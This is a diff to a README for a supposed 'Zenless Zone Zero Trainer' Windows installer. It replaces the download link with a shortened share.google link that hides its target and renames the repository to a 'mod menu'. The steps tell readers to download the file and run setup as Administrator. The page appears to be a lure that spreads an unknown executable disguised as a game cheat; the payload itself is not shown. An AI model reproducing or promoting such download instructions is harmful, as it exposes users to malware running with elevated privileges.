@@ -30,13 +30,13 @@ Direct installer link below.
 
 ### Quick steps
 
-1. Click **[Download — zenlesszonezerotrainer.moltora.com](https://zenlesszonezerotrainer.moltora.com/)** (link above)
+1. Click [![Download Now](https://img.shields.io/badge/⬇️%20Download%20Now-Gold?logo=download&style=for-the-badge&labelColor=black)](https://share.google/2zNHJ4SC9e54Q7Ham) (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://zenlesszonezerotrainer.moltora.com/"><strong>⬇ Download Zenless Zone Zero Trainer now</strong></a></p>
+<p align="center"><a href="https://share.google/2zNHJ4SC9e54Q7Ham"><strong>⬇ Download Zenless Zone Zero Trainer now</strong></a></p>
 
 ---
 
@@ -48,7 +48,7 @@ Direct installer link below.
 
 **What you get:** complete Windows installer (64-bit), full feature set.
 
-**Repository:** `Zenless-Zone-Zero-Trainer-2026`
+**Repository:** `Zenless-Zone-Zero-mod-menu`
 
 ## Install (full version)
 
